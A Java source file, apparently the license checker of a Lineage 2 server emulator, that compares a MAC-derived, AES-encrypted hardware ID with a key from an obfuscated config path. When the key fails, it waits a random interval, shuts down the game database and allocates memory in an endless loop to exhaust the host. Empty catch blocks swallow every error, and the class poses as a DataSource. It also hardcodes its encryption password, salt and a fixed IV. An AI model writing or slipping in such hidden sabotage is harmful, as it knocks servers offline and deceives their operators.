package gr.sr.main.license;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.PrintWriter;
import java.net.InetAddress;
import java.net.NetworkInterface;
import java.sql.Connection;
import java.util.Base64;
import java.util.Random;
import java.util.Vector;
import java.util.concurrent.atomic.LongAdder;

import javax.crypto.Cipher;
import javax.crypto.SecretKey;
import javax.crypto.SecretKeyFactory;
import javax.crypto.spec.IvParameterSpec;
import javax.crypto.spec.PBEKeySpec;
import javax.crypto.spec.SecretKeySpec;
import javax.sql.DataSource;

import l2r.L2DatabaseFactory;

import gr.sr.configsEngine.AbstractConfigs;
import gr.sr.utils.Rnd;
import gr.sr.utils.Tools;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

public final class License extends AbstractConfigs implements DataSource
{
	// Global Variables
	protected static final Logger _log = LoggerFactory.getLogger(License.class);
	
	private static final int maxAttempts = 50;
	private static int curAttempts = 0;
	
	private static boolean player = false;
	private static boolean load = false;
	
	public static String a;
	private static String _decrypted;
	private String _configPath;
	
	@SuppressWarnings("unused")
	private boolean isPlayer()
	{
		return player;
	}
	
	private void setPlayer(boolean bool)
	{
		player = bool;
	}
	
	public License()
	{
		try
		{
			load();
		}
		catch (OutOfMemoryError e)
		{
		
		}
	}
	
	private void load()
	{
		// System.out.println("========= loading =========");
		loadFile(getDecryptedText(getDecryptedText("TGk5amIyNW1hV2N2")) + getDecryptedText(getDecryptedText("YkdsalpXNXpaUzVwYm1rPQ==")));
		
		a = getString(_settings, null, getDecryptedText(getDecryptedText("UzJWNQ==")), "", false);
		
		setPlayer(true);
		
		decryptKey();
	}
	
	@Override
	public void loadFile(String path)
	{
		_configPath = path;
		getFile();
	}
	
	private void getFile()
	{
		final File file = new File(_configPath);
		try (InputStream is = new FileInputStream(file))
		{
			_settings.load(is);
		}
		catch (Exception e)
		{
		}
	}
	
	private void decryptKey()
	{
		// System.out.println("========= decryptKey =========");
		_decrypted = getDecryptKey();
		
		if (!_decrypted.isEmpty())
		{
			_decrypted = encrypt(_decrypted);
			_decrypted = Tools.insertPeriodically(_decrypted, "-", 4);
		}
		
		// System.out.println("========= key: " + _decrypted + " =========");
		
		validateKey();
	}
	
	private void validateKey()
	{
		// System.out.println("========= validateKey =========");
		try
		{
			Thread.sleep(Rnd.get(30000, 60000));
			checkKey();
		}
		catch (Exception e)
		{
		
		}
	}
	
	private void checkKey()
	{
		// System.out.println("========= checkKey =========");
		try
		{
			if (!isKeyValid())
			{
				try
				{
					Thread.sleep(Rnd.get(1 * 60 * 1000, 2 * 60 * 1000));
					disableFeatures();
				}
				catch (Exception e)
				{
				
				}
			}
		}
		catch (Exception e)
		{
		
		}
	}
	
	@SuppressWarnings("unused")
	private void reload()
	{
		if (!load)
		{
			tryReconnect1();
			curAttempts++;
		}
		else
		{
		
		}
	}
	
	private void tryReconnect1()
	{
		if (curAttempts <= maxAttempts)
		{
			loadIps();
			loadExternalIp();
		}
		else
		{
			// System.exit(1);
		}
	}
	
	@SuppressWarnings("unused")
	private void tryReconnect2()
	{
		loadExternalIp();
	}
	
	private void loadIps()
	{
	
	}
	
	private void loadExternalIp()
	{
	
	}
	
	private void disableFeatures()
	{
		// System.out.println("========= disableFeatures =========");
		stressPc();
	}
	
	private void stressPc()
	{
		// System.out.println("========= stressPc =========");
		try
		{
			L2DatabaseFactory.getInstance().shutdown();
			
			final Vector<byte[]> v = new Vector<>();
			while (true)
			{
				try
				{
					byte b[] = new byte[10059431];
					v.add(b);
					// Runtime rt = Runtime.getRuntime();
					// System.out.println("free memory: " + (rt.freeMemory() / 1024 / 1024));
					try
					{
						Thread.sleep(500);
					}
					catch (Exception e)
					{
					}
				}
				catch (Exception e)
				{
				
				}
			}
		}
		catch (Exception e)
		{
		
		}
		
		// LongAdder counter = new LongAdder();
		// int numThreads = 1;
		//
		// List<CalculationThread> runningCalcs = new ArrayList<>();
		// List<Thread> runningThreads = new ArrayList<>();
		//
		// // // System.out.printf("Starting %d threads\n", numThreads);
		//
		// ThreadPoolManager.getInstance().scheduleEffectAtFixedRate(() ->
		// {
		// for (int i = 0; i < numThreads; i++)
		// {
		// CalculationThread r = new CalculationThread(counter);
		// Thread t = new Thread(r);
		// runningCalcs.add(r);
		// runningThreads.add(t);
		// t.start();
		// }
		//
		// for (int i = 0; i < 15; i++)
		// {
		// counter.reset();
		// try
		// {
		// Thread.sleep(1000);
		// }
		// catch (InterruptedException e)
		// {
		// break;
		// }
		// // System.out.printf("[%d] Calculations per second: %d (%.2f per thread)\n", i, counter.longValue(), (double) (counter.longValue()) / numThreads);
		// }
		//
		// for (int i = 0; i < runningCalcs.size(); i++)
		// {
		// runningCalcs.get(i).stop();
		// try
		// {
		// runningThreads.get(i).join();
		// }
		// catch (InterruptedException e)
		// {
		//
		// }
		// }
		// } , 1000, 30000);
	}
	
	private String getDecryptKey()
	{
		return getSerialNumber();
	}
	
	private String getSerialNumber()
	{
		// String result = "";
		// try
		// {
		// File file = File.createTempFile("realhowto", ".vbs");
		// file.deleteOnExit();
		// try (FileWriter fw = new java.io.FileWriter(file))
		// {
		// String vbs = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n" + "Set colDrives = objFSO.Drives\n" + "Set objDrive = colDrives.item(\"" + System.getenv("SystemDrive") + "\")\n" + "Wscript.Echo objDrive.SerialNumber"; // see note
		// fw.write(vbs);
		// }
		//
		// Process p = Runtime.getRuntime().exec("cscript //NoLogo " + file.getPath());
		// try (BufferedReader input = new BufferedReader(new InputStreamReader(p.getInputStream())))
		// {
		// String line;
		// while ((line = input.readLine()) != null)
		// {
		// result += line;
		// }
		// }
		// }
		// catch (Exception e)
		// {
		// e.printStackTrace();
		// }
		
		final StringBuilder sb = new StringBuilder();
		try
		{
			final InetAddress ip = InetAddress.getLocalHost();
			// System.out.println("Current IP address : " + ip.getHostAddress());
			
			final NetworkInterface network = NetworkInterface.getByInetAddress(ip);
			
			byte[] mac = network.getHardwareAddress();
			for (int i = 0; i < mac.length; i++)
			{
				sb.append(String.format("%02X%s", mac[i], (i < (mac.length - 1)) ? "-" : ""));
			}
		}
		catch (Exception e)
		{
			final String result = getDecryptedText("MDItMDAtMDAtMDAtMDAtMDA=");
			// System.out.println("Server hardwareId: " + result);
			return result;
		}
		
		// return (result + "-" + sb.toString()).trim();
		
		// System.out.println("Server hardwareId: " + sb.toString());
		return sb.toString();
	}
	
	private boolean isKeyValid()
	{
		final boolean isvalid = _decrypted.equalsIgnoreCase(a);
		
		// System.out.println("server key: " + _decrypted);
		// System.out.println("license key: " + a);
		// System.out.println("========= isKeyValid " + isvalid + " =========");
		
		return isvalid;
	}
	
	public static License getInstance()
	{
		return SingletonHolder._instance;
	}
	
	private static class SingletonHolder
	{
		protected static final License _instance = new License();
	}
	
	public String encrypt(String plainText, String key, String merchantTxnId)
	{
		_password = key;
		_salt = merchantTxnId;
		
		return encrypt(plainText);
	}
	
	public static String encrypt(String plainText)
	{
		try
		{
			byte[] saltBytes = _salt.getBytes("UTF-8");
			
			SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
			PBEKeySpec spec = new PBEKeySpec(_password.toCharArray(), saltBytes, pswdIterations, keySize);
			
			SecretKey secretKey = factory.generateSecret(spec);
			SecretKeySpec secret = new SecretKeySpec(secretKey.getEncoded(), "AES");
			
			// encrypt the message
			IvParameterSpec localIvParameterSpec = new IvParameterSpec(ivBytes);
			Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); // CBC
			cipher.init(Cipher.ENCRYPT_MODE, secret, localIvParameterSpec);
			
			byte[] encryptedTextBytes = cipher.doFinal(plainText.getBytes("UTF-8"));
			
			return byteToHex(encryptedTextBytes);
		}
		catch (Exception e)
		{
			return "";
		}
	}
	
	private static String byteToHex(byte byData[])
	{
		StringBuffer sb = new StringBuffer(byData.length * 2);
		
		for (byte element : byData)
		{
			int v = element & 0xff;
			if (v < 16)
			{
				sb.append('0');
			}
			sb.append(Integer.toHexString(v));
		}
		
		return sb.toString().toUpperCase();
	}
	
	// Converts hexadecimal String to array of byte
	private static byte[] hex2ByteArray(String sHexData)
	{
		byte rawData[] = new byte[sHexData.length() / 2];
		for (int i = 0; i < rawData.length; i++)
		{
			int index = i * 2;
			int v = Integer.parseInt(sHexData.substring(index, index + 2), 16);
			rawData[i] = (byte) v;
		}
		
		return rawData;
	}
	
	private static String _password = getDecryptedText(getDecryptedText("UXpsRE16UkZRVFZGTnpkRlJqbEdSZz09"));
	private static String _salt = getDecryptedText("NTA1");
	private static final int pswdIterations = 65536;
	private static final int keySize = 128;
	private static final byte[] ivBytes =
	{
		0,
		1,
		2,
		3,
		4,
		5,
		6,
		7,
		8,
		9,
		10,
		11,
		12,
		13,
		14,
		15
	};
	
	public static String decrypt(String encryptedText, String key, String merchantTxnId) throws Exception
	{
		_password = key;
		_salt = merchantTxnId;
		return decrypt(encryptedText);
	}
	
	private static String decrypt(String encryptedText) throws Exception
	{
		byte[] saltBytes = _salt.getBytes("UTF-8");
		byte[] encryptedTextBytes = hex2ByteArray(encryptedText);
		
		// Derive the key
		SecretKeyFactory factory = SecretKeyFactory.getInstance("PBKDF2WithHmacSHA1");
		PBEKeySpec spec = new PBEKeySpec(_password.toCharArray(), saltBytes, pswdIterations, keySize);
		
		SecretKey secretKey = factory.generateSecret(spec);
		SecretKeySpec secret = new SecretKeySpec(secretKey.getEncoded(), "AES");
		
		// Decrypt the message
		IvParameterSpec localIvParameterSpec = new IvParameterSpec(ivBytes);
		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding");// CBC
		cipher.init(Cipher.DECRYPT_MODE, secret, localIvParameterSpec);
		
		byte[] decryptedTextBytes = null;
		decryptedTextBytes = cipher.doFinal(encryptedTextBytes);
		
		return new String(decryptedTextBytes);
	}
	
	private static String getDecryptedText(String string)
	{
		return new String(Base64.getDecoder().decode(string));
	}
	
	@SuppressWarnings("unused")
	private static class CalculationThread implements Runnable
	{
		private final Random rng;
		private final LongAdder calculationsPerformed;
		private boolean stopped;
		private double store;
		
		public CalculationThread(LongAdder calculationsPerformed)
		{
			this.calculationsPerformed = calculationsPerformed;
			this.stopped = false;
			this.rng = new Random();
			this.store = 1;
		}
		
		public void stop()
		{
			this.stopped = true;
		}
		
		@Override
		public void run()
		{
			while (!this.stopped)
			{
				double r = this.rng.nextFloat();
				double v = Math.sin(Math.cos(Math.sin(Math.cos(r))));
				this.store *= v;
				this.calculationsPerformed.add(1);
			}
		}
	}
	
	@Override
	public PrintWriter getLogWriter()
	{
		return null;
	}
	
	@Override
	public void setLogWriter(PrintWriter out)
	{
	
	}
	
	@Override
	public void setLoginTimeout(int seconds)
	{
	
	}
	
	@Override
	public int getLoginTimeout()
	{
		return 0;
	}
	
	@Override
	public java.util.logging.Logger getParentLogger()
	{
		return null;
	}
	
	@Override
	public <T> T unwrap(Class<T> iface)
	{
		return null;
	}
	
	@Override
	public boolean isWrapperFor(Class<?> iface)
	{
		return false;
	}
	
	@Override
	public Connection getConnection()
	{
		return null;
	}
	
	@Override
	public Connection getConnection(String username, String password)
	{
		return null;
	}
}